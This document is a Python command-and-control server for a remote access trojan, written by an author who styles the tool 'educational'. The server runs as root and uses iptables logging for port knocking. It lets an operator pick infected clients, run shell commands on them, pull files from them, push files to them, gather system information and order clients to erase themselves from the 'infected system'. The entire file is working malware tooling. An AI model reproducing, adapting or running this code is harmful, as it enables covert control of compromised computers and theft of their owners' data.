#!/usr/bin/env python
__author__     = "rekcah"
__email__ = "rekcah@keabyte.com"
__desc__ = "For educational purposes only ;)"

import socket, os, _thread, subprocess, sys, string, secrets, time

from subprocess import Popen
from random import randint

# Print color codes

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple

# End Print color codes

#####################################################################################

BUFFER = 4096
ENCODING = "utf-8"

server = '0.0.0.0'
port = 5010
users = 99
s = socket.socket()
conns = []
clientId = -1
files = False
filename = None
_key = 2293
killedId = []

# "Knockable" Ports (they're not reserved though)
portSet = [5010, 5011, 5012, 5013, 5014, 5015, 5016, 5017, 5018, 5019, 5020]

log = "/var/log/messages"

connecting = False

######################################################################################

def displayHelp ():

    print(W)
    print("Help : shows all the commands ")
    print("sel [client id] : selects the client with the id")
    print("shell [command] : sends shell command to the client (the client must have been selected prior to this")
    print("getinfo : displays informations on the client's system (the client must have been select prior to this")
    print("getfile [/REMOTE/PATH/TO/FILE] [REMOTE_FILENAME] : get the file with the path on the client's side")
    print("SENDFILE [/PATH/TO/LOCAL/FILE] [TARGET/FOLDER/ON/CLIENT] [TARGET FILENAME] : uploads the file to the client on the remote path provided")
    print("kill [client_id] : kills the client with the matching id")
    print("remove [client_id] : the client autoremoves itself and leaves no trace on the infected system")
    print("list : lists all connected clients")
    print("exit : Exist the server killing all the connexions (not removing clients)")
    print(W)

def getResponse(user):
    global clientId, conns, s, BUFFER, connecting, files, filename, ENCODING
    # fileBuffer = None
    while True:
        raw = conns[user].recv(BUFFER)
        data = raw.decode(ENCODING)

        if "!FILE!" in data.upper() :
            # The client is sending a file!
            # Awesome, let's read it!
            if files:
                print(G + "\n[+] Receiving a file from the client." + W)
                if not os.path.isdir("data/"):
                    os.mkdir("data/")

                if filename is None:
                    filename = "".join(
                        secrets.choice(string.ascii_letters + string.digits + string.punctuation + string.hexdigits) for
                        _ in range(randint(2, 20)))

                file = open("data/" + filename, "wb")
                # read bytes
                while "!ENDFILE!" not in data.upper():
                    tmp = conns[user].recv(BUFFER)
                    data = tmp.decode(ENCODING)
                    if "!ENDFILE!" not in data.upper() :
                        raw += tmp
                file.write(raw)
                print(G + "[+] File downloaded at data/%s" % filename)
                file.close()
                files = False
                filename = None
            else :
                # We're not expecing a file but we need to read it to empty the socket
                while "!ENDFILE!" not in data.upper():
                    tmp = conns[clientId].recv(BUFFER)
                    data = tmp.decode(ENCODING)
        else :
            print(P + "\n\n[*] Client [%d] response : | \n\n%s" % (user+1, data) + W)

        if not data or connecting:
            break
    print('Closing connections')
    s.close()


def connectUsers():
    global  connecting, ENCODING, users, s

    while True:
        conn, addr = s.accept()
        conns.append(conn)
        connecting = True
        print(G + "\n[+] A new client is connected at [%s,%d] " % addr + W)
        print(G + "\n[+] New client's Id is : >> " + str(len(conns)) + " <<")
        _thread.start_new_thread(getResponse, ((len(conns) - 1),))
        connecting = False


def parseCommand():
    global files, filename, clientId, ENCODING, killedId
    _thread.start_new_thread(connectUsers, ())
    while True :
        cmd = input(B + "\nYour command >> " + W)
        if cmd.upper() == "HELP":
            displayHelp()
            parseCommand()
        elif cmd.upper() == "KILL":
            if clientId < 0:
                print(R + "[-] You need to select a target client with the 'SEL [id]' command first" + W)
            else:
                if input(R + "/!\ Are you sure you want to kill the client [%s] ? /!\ ? yes/no \n" % str(clientId + 1) + W).upper() == "YES":
                    print(O + "[!] Clossing remote connections : ID = ["+ str(clientId) +"] at [%s : %d]..." % conns[clientId].getsockname() + W)
                    conns[clientId].send("KILL".encode(ENCODING))
                    # add the id to the killed Ids. We do not remove the connection for simplicity (threads, next connections, etc..)
                    killedId.append(clientId)
                    clientId = -1  # Reset the client_id
                    print(O + "[!] Client removed..." + W)
        elif cmd.upper() == "LIST":
            print(B + "\n[*] Connected clients lists : ")
            i = 1
            for each in range(len(conns)):
                # just hide the killed sessions
                if each not in killedId :
                    print(G + "\tId >> " + str(each + 1) + " << Connected at  [%s : %d] " % (conns[each]).getsockname())
            print(W)
        elif cmd.upper() == "EXIT":
            if input(R + "/!\ Are you sure you want to exit the C&C ? /!\ ? yes/no" + W).upper() == "YES":
                print(O + "[!] Clossing remote connections..." + W)
                s.close()
                print(O + "[!] Connections closedd. Exiting..." + W)
                print(B + "[*] Bye!!" + W)
                s.close()
                sys.exit(0)
        elif cmd.upper() == "GETINFO":
            if clientId < 0:
                print(R + "[-] You need to select a target client with the 'SEL [id]' command first" + W)
            else:
                # this can be encrypted (maybe a xor function ?)
                conns[clientId].send("getinfo".encode(ENCODING))
        else:
            if "GETFILE" in cmd.upper():
                if clientId < 0:
                    print(R + "[-] You need to select a target client with the 'SEL [id]' command first" + W)
                else:
                    # we need to prepare
                    # Remember the synthax is GETFILE [/REMOTE/PATH/TO/FILE] [REMOTE_FILENAME]
                    args = cmd.split(" ")  # Get the args
                    if len(args) != 3:
                        print(R + "[-] The synthax is GETFILE [/REMOTE/PATH/TO/FILE] [REMOTE_FILENAME]" + W)
                    else:
                        print(O + "[!] Requesting remote file '%s' " % (args[1] + args[2]))
                        conns[clientId].send(("getfile " + args[1] + args[2]).encode(ENCODING))
                        files = True
                        filename = args[2]
            elif "SEL" in cmd.upper():
                args = cmd.split(" ")
                if len(args) != 2:
                    print(R + "[-] The synthax is SEL [CLIENT_ID]" + W)
                else:
                    if 0 >= int(args[1]) > len(conns):
                        print(R + "[-] Invalid client id entered. Ignoring..." + W)
                    elif (0 < int(args[1]) <= len(conns)) and (int(args[1]) not in killedId):
                        clientId = int(args[1]) - 1
                        print(G + "[+] Selected client is now client >> " + args[1] +
                              " << connected at [%s, %d]" % conns[clientId].getsockname() + W)
                    else :
                        print(R + "[-] You've entered a non-existant client Id." + W)
            elif "SHELL" in cmd.upper() :
                # Send a shell command to the client
                args = cmd.split(" ")
                if 0 > len(args) < 2 :
                    print(R + "[-] The synthax is SHELL [COMMAND TO EXECUTE]" + W)
                else :
                    conns[clientId].send(cmd.encode(ENCODING))
            elif "SENDFILE" in cmd.upper() :
                # Send a file and eventually
                print(B + "[*] Sending file to the host" + W)
                args = cmd.split(" ")
                if len(args) == 4 :
                    localFile = args[1]
                    if os.path.isfile(args[1]):
                        # File exists we can send it
                        conns[clientId].send(cmd.encode(ENCODING))
                        time.sleep(2)
                        with open(localFile, "rb") as file:
                            conns[clientId].send("!FILE!".encode(ENCODING))
                            buff = file.read(BUFFER)
                            time.sleep(2)
                            # start sending the file
                            while buff:
                                conns[clientId].send(buff)
                                buff = file.read(BUFFER)
                        # File sent let's notify the client
                        conns[clientId].send("!ENDFILE!".encode(ENCODING))
                    else :
                        print(R + "[-] The local file does'nt exists..." + R)
                else :
                    print(R + "[-] The syntax is SENDFILE [/PATH/TO/LOCAL/FILE] [TARGET/FOLDER/ON/CLIENT] [TARGET FILENAME]" + W)
            else :
                displayHelp()


def configIptables(clean=True):
    global portSet
    if clean :
        # Clean all the previous rules
        for i in range(len(portSet)) :
            #remove the rules for the firewall
            Popen(["iptables --delete INPUT -p tcp --dport %d -j LOG" % (portSet[i] ^ (_key * 25))],
                  shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    #add this rule : "iptables -I INPUT -p tcp --dport [PORT_NUM] -j LOG"
    for i in range(len(portSet)) :
        # Add the firewall rule for each available port
        # This firewall rule with add a log entry in /var/log/messages everytime a request is made on that port
        Popen(["iptables -I INPUT -p tcp --dport %d -j LOG" % (portSet[i] ^ (_key * 25))],
              shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

def checkPermissions():
    if os.getuid() != 0:
        print(R + "[-] Sorry, you must be root to run this C&C." + W)
        sys.exit(2)

def main():
    global s, server, port, users, conns

    # Check we have the root privs (needed to read the log file)
    checkPermissions()

    # From now we have the right permissions
    knocked = False
    # Launch the daemon and wait for a connection
    configIptables(True)    # Clean old rules and configure the firewall
    print(G + "[+] Iptables rules configured... Waiting for incomming clients..." + W)

    while not knocked :
        # tail the /var/log/messages file to find the connections attemps on the port
        # clean the logs before (to remove previous connections on the servers)
        # logrotate -f /etc/logrotate.conf
        subprocess.Popen(["logrotate", "-f", "/etc/logrotate.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logFilePointer = subprocess.Popen(['tail', '-F', log], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            line = logFilePointer.stdout.readline()
            print(B + "[*] tail log file : %s" % line)
            for i in range(len(portSet)) :
                needle = portSet[i] ^ (_key * 25)
                if ("DPT=".encode(ENCODING) + str(needle).encode(ENCODING)) in line :
                    port = needle ^ (_key * 25)  # the right port to open...
                    print(G + "[+] Someone is knocking at the heavens door..." + W)
                    print(G + "[+] The door knocked at is : %s" % str(portSet[i]) + W)
                    print(G + "[+] The door Saint Peter will open is : %s " % str(port) + W)
                    try :
                        s.bind((server, port))
                        s.listen(users)
                    except Exception as e :
                        print(R + "[-] An error occured, unable to bind the port.. [%s]" % str(e) + W)
                        print(R + "[-] Exiting the program... Bye!" + W)
                        sys.exit(2)
                    print(B + "[*] Waiting for connections on port %s ..." % str(port) + W)
                    knocked = True
                    break
            if knocked :
                break

    # the client has knocked at the heavens doors, we'll open'em up to it

    print(G + "[+] Server started... Waiting for the snitches..." + W)

    _thread.start_new_thread(parseCommand(), ())

    while True:
        pass

    s.close()
    sys.exit(0)

if __name__ == '__main__':
    main()
